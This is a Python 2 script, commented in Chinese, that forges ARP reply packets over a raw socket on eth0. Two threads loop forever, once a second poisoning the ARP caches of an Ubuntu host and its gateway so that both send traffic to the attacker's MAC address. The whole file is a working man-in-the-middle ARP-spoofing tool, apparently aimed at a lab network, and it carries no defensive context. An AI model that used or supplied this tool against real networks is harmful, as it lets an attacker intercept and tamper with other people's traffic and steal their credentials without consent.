# -*- coding: UTF-8 -*-
import sys
import socket
import struct
import time
import threading


def arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip):
    #以太网首部
    #以太网目的地址
    des_eth_mac=des_mac
    #以太网源地址
    src_eth_mac=src_mac
    #帧类型
    frame_type=b'\x08\x06'

    #ARP报文首部
    #硬件地址
    hardware_type=b'\x00\x01'
    #协议类型
    pro_type=b'\x08\x00'
    #硬件地址长度
    hardware_len=b'\x06'
    #协议地址长度
    pro_len=b'\x04'
	
    #op
    op=b'\x00\x02'
	
    #发送端以太网地址
    sender_mac=src_eth_mac
    #发送端IP地址
    sender_ip=socket.inet_aton(src_ip)
    #接收端以太网地址
    target_mac=des_eth_mac
    #接收端IP地址
    target_ip=socket.inet_aton(des_ip)

    return struct.pack("!6s6s2s2s2s1s1s2s6s4s6s4s",des_eth_mac,src_eth_mac,frame_type,hardware_type,pro_type,hardware_len,pro_len,op,sender_mac,sender_ip,target_mac,target_ip)



def send_arp(src_mac,src_ip,des_mac,des_ip):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind(("eth0", 0))
    reply_packet=arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip)

    s.send(reply_packet)


def send_to_ubuntu(src_mac,fake_src_ip,des_mac,des_ip):

    print "send arp reply to ubuntu"

    while 1:
        send_arp(src_mac,fake_src_ip,des_mac,des_ip)
        time.sleep(1)

def send_to_gateway(src_mac,fake_src_ip,des_mac,des_ip):

    print "send arp reply to gateway"

    while 1:
        send_arp(src_mac,fake_src_ip,des_mac,des_ip)
        time.sleep(1)

#本机MAC地址          
src_mac=b'\x00\x0c\x29\x72\xb5\xa0'

#伪造的发送端IP地址
fake_src_gateway_ip='192.168.121.2'
fake_src_ubuntu_ip='192.168.121.129'

#目的MAC地址ubuntu
des_mac_u=b'\x00\x0c\x29\xb7\x52\xa0'
#目的IP地址ubuntu
des_ip_u='192.168.121.129'

#目的MAC地址gateway
des_mac_g=b'\x00\x50\x56\xf8\xb6\xec'
#目的IP地址gateway
des_ip_g='192.168.121.2'


#启动发送给Ubuntu线程
thread = threading.Thread(target=send_to_ubuntu, args=(src_mac,fake_src_gateway_ip,des_mac_u,des_ip_u))
thread.start()

time.sleep(0.1)

#启动发送给gateway线程
thread = threading.Thread(target=send_to_gateway, args=(src_mac,fake_src_ubuntu_ip,des_mac_g,des_ip_g))
thread.start()



